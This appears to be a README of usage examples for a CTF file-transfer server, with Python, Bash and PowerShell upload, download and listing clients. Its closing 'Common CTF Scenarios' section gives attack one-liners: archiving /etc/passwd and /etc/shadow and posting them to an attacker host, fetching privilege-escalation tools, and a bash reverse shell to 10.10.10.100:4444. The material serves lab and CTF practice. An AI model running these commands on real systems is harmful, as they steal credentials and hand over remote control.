# CTF Server Examples

This directory contains usage examples for the CTF server in different programming languages.

## Python Examples

### Upload File
```python
import requests
import os

def upload_file(file_path, server_url="http://localhost:8080"):
    """Upload a file to the CTF server"""
    try:
        with open(file_path, 'rb') as f:
            files = {'file': f}
            response = requests.post(f"{server_url}/api/v1/upload", files=files)
            result = response.json()
            
            if result['success']:
                print(f"✅ Upload successful: {result['filename']} ({result['size']} bytes)")
                return result['path']
            else:
                print(f"❌ Upload failed: {result['error']}")
                return None
    except Exception as e:
        print(f"❌ Error uploading file: {e}")
        return None

# Usage
upload_file("exploit.py")
```

### Download File
```python
import requests

def download_file(remote_path, local_path=None, server_url="http://localhost:8080"):
    """Download a file from the CTF server"""
    if local_path is None:
        local_path = os.path.basename(remote_path)
    
    try:
        response = requests.get(f"{server_url}/files/{remote_path}", stream=True)
        response.raise_for_status()
        
        with open(local_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        print(f"✅ Downloaded: {remote_path} -> {local_path}")
        return True
    except Exception as e:
        print(f"❌ Error downloading file: {e}")
        return False

# Usage
download_file("tools/nmap", "./nmap")
```

### List Files
```python
import requests
import json

def list_files(server_url="http://localhost:8080"):
    """Get file tree from the CTF server"""
    try:
        response = requests.get(f"{server_url}/api/v1/filetree")
        result = response.json()
        
        if result['success']:
            print_tree(result['root'])
        else:
            print(f"❌ Error: {result['error']}")
    except Exception as e:
        print(f"❌ Error getting file tree: {e}")

def list_files_pretty(server_url="http://localhost:8080"):
    """Get human-readable file tree from the CTF server"""
    try:
        # Use the short /tree endpoint for plain text
        response = requests.get(f"{server_url}/api/v1/tree")
        print(response.text)
    except Exception as e:
        print(f"❌ Error getting file tree: {e}")

def print_tree(node, prefix=""):
    """Recursively print the file tree"""
    print(f"{prefix}{node['name']}")
    if node.get('children'):
        for i, child in enumerate(node['children']):
            is_last = i == len(node['children']) - 1
            child_prefix = prefix + ("└── " if is_last else "├── ")
            next_prefix = prefix + ("    " if is_last else "│   ")
            print(f"{child_prefix}{child['name']}")
            if child.get('children'):
                print_tree(child, next_prefix)

# Usage
list_files()           # Structured JSON
list_files_pretty()    # Human-readable tree
```

## Bash Examples

### Upload with curl
```bash
#!/bin/bash

upload_file() {
    local file_path="$1"
    local server_url="${2:-http://localhost:8080}"
    
    if [[ ! -f "$file_path" ]]; then
        echo "❌ File not found: $file_path"
        return 1
    fi
    
    echo "Uploading $file_path..."
    response=$(curl -s -X POST -F "file=@$file_path" "$server_url/api/v1/upload")
    
    if echo "$response" | jq -e '.success == true' > /dev/null 2>&1; then
        filename=$(echo "$response" | jq -r '.filename')
        size=$(echo "$response" | jq -r '.size')
        echo "✅ Upload successful: $filename ($size bytes)"
    else
        error=$(echo "$response" | jq -r '.error')
        echo "❌ Upload failed: $error"
    fi
}

# Usage
upload_file "payload.sh"
```

### List files with curl
```bash
#!/bin/bash

list_files() {
    local server_url="${1:-http://localhost:8080}"
    
    echo "=== File Tree (JSON) ==="
    curl -s "$server_url/api/v1/filetree" | jq .
    
    echo -e "\n=== Pretty Tree (Plain Text) ==="
    curl -s "$server_url/api/v1/tree"
    
    echo -e "\n=== Using ls alias ==="
    curl -s "$server_url/api/v1/ls"
}

# Usage
list_files
```

### Download with wget
```bash
#!/bin/bash

download_file() {
    local remote_path="$1"
    local local_path="${2:-$(basename "$remote_path")}"
    local server_url="${3:-http://localhost:8080}"
    
    echo "Downloading $remote_path..."
    if wget -q --show-progress "$server_url/files/$remote_path" -O "$local_path"; then
        echo "✅ Downloaded: $remote_path -> $local_path"
    else
        echo "❌ Download failed"
        return 1
    fi
}

# Usage
download_file "tools/linpeas.sh"
```

## PowerShell Examples

### Upload File
```powershell
function Upload-File {
    param(
        [Parameter(Mandatory=$true)]
        [string]$FilePath,
        
        [string]$ServerUrl = "http://localhost:8080"
    )
    
    if (-not (Test-Path $FilePath)) {
        Write-Host "❌ File not found: $FilePath" -ForegroundColor Red
        return
    }
    
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileName = Split-Path $FilePath -Leaf
        
        $boundary = [System.Guid]::NewGuid().ToString()
        $bodyLines = @(
            "--$boundary",
            "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
            "Content-Type: application/octet-stream",
            "",
            [System.Text.Encoding]::Latin1.GetString($fileBytes),
            "--$boundary--"
        )
        
        $body = $bodyLines -join "`r`n"
        $contentType = "multipart/form-data; boundary=$boundary"
        
        $response = Invoke-RestMethod -Uri "$ServerUrl/api/v1/upload" -Method Post -Body $body -ContentType $contentType
        
        if ($response.success) {
            Write-Host "✅ Upload successful: $($response.filename) ($($response.size) bytes)" -ForegroundColor Green
        } else {
            Write-Host "❌ Upload failed: $($response.error)" -ForegroundColor Red
        }
    } catch {
        Write-Host "❌ Error uploading file: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Usage
Upload-File -FilePath "C:\tools\exploit.exe"
```

### Download File
```powershell
function Download-File {
    param(
        [Parameter(Mandatory=$true)]
        [string]$RemotePath,
        
        [string]$LocalPath,
        [string]$ServerUrl = "http://localhost:8080"
    )
    
    if (-not $LocalPath) {
        $LocalPath = Split-Path $RemotePath -Leaf
    }
    
    try {
        Invoke-WebRequest -Uri "$ServerUrl/files/$RemotePath" -OutFile $LocalPath
        Write-Host "✅ Downloaded: $RemotePath -> $LocalPath" -ForegroundColor Green
    } catch {
        Write-Host "❌ Download failed: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Usage
Download-File -RemotePath "tools/nc.exe" -LocalPath ".\nc.exe"
```

## Common CTF Scenarios

### 1. Exfiltrating Data
```bash
# Compress and upload sensitive files
tar -czf data.tar.gz /etc/passwd /etc/shadow
curl -X POST -F "file=@data.tar.gz" http://10.10.10.100:8080/api/v1/upload
```

### 2. Getting Tools
```bash
# Download common tools
wget http://10.10.10.100:8080/files/tools/linpeas.sh
wget http://10.10.10.100:8080/files/tools/pspy64
chmod +x linpeas.sh pspy64
```

### 3. Reverse Shell Payloads
```python
# Upload reverse shell
import requests

payload = '''#!/bin/bash
bash -i >& /dev/tcp/10.10.10.100/4444 0>&1
'''

with open('shell.sh', 'w') as f:
    f.write(payload)

# Upload the payload
with open('shell.sh', 'rb') as f:
    files = {'file': f}
    requests.post('http://10.10.10.100:8080/api/v1/upload', files=files)
```

### 4. Quick File Transfer
```bash
# One-liner to transfer a file
curl -X POST -F "file=@important.txt" http://10.10.10.100:8080/api/v1/upload && echo "Transfer complete"
```
